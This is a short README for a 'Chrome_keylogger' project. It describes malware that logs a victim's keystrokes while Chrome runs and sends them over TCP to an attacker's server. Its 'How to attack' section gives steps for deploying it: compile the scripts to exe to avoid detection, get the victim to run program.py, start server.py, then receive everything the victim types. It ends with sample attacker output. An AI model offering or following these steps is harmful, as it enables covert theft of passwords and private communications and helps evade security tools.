# Chrome_keylogger
A keylogger that starts logging when chrome is running. This malware will send the keystrokes from a TCP client back to the malicious TCP server


# How to attack:
First of all, you can edit the code a bit and compile all the scripts into exe for less detection.

Follow these steps:
  1- The victim must run program.py, when the file is ran, the keylogger and the TCP Client will start too.
  2- The attacker must run server.py then bind his/her IP and port.
  3- You will start receiving everything the victim types.

# Deeper demonstration:

Attacker:
    python3 server.py
    
    Output:
    IP: type_your_ip_here
    Port: 8080
    Client (client_ip) connected.
